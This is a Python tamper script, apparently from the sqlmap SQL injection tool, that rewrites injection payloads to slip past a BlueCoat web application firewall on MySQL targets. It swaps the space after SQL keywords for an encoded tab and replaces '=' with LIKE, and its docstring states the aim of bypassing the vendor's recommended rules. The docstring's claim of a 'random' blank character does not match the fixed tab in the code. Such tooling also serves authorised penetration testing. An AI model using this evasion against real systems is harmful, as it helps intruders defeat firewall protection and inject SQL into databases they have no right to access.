#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def process(match):
  word = match.group()
  word = "%sLIKE%s" % (" " if word[0] != " " else "", " " if word[-1] != " " else "")
  return word

def tamper(payload, headers=None):
	"""
    First Replaces the space after 'select ' with a valid random blank character.
		Then replace = with like

    Example:
        * Input: SELECT id FROM users where id = 1
        * Output: SELECT%09id FROM users where id like 1

    Requirement:
        * MySQL, Bluecoat SGos with Waf activated as documented in
        https://kb.bluecoat.com/index?page=content&id=FAQ2147

    Tested against:
        * MySQL 5.1, SGos Rules

    Notes:
        * Useful to bypass BlueCoat recommanded Waf rule configuration
	"""

# ASCII table:
#   TAB     09      horizontal TAB
	blanks = '%09'
	retVal = payload

	if payload:
		for commands in ['SELECT','UPDATE','INSERT','DELETE']:
			retVal = retVal.replace(commands + ' ', commands + blanks)
		retVal = re.sub(r"\s*=\s*", lambda match: process(match), retVal)

	return retVal
